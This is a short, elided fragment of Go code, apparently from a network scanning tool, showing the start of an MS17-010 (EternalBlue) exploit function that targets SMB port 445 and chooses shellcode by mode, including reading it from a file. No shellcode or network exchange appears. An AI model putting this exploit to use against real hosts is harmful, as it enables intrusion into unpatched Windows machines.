...
func MS17010EXP(info nonweb_utils.HostInfo) {
	address := info.Host + ":445"
	var sc string
	_local_fake_sc := "add"
	switch _local_fake_sc {
	case "bind":
	...
	default:
		if strings.Contains(_local_fake_sc, "file:") {
			read, err := ioutil.ReadFile(_local_fake_sc[5:])
			if err != nil {
				errlog := fmt.Sprintf("[-] ms17010 sc readfile %v error: %v", _local_fake_sc, err)
				logger.Error(errlog)
				return
			}
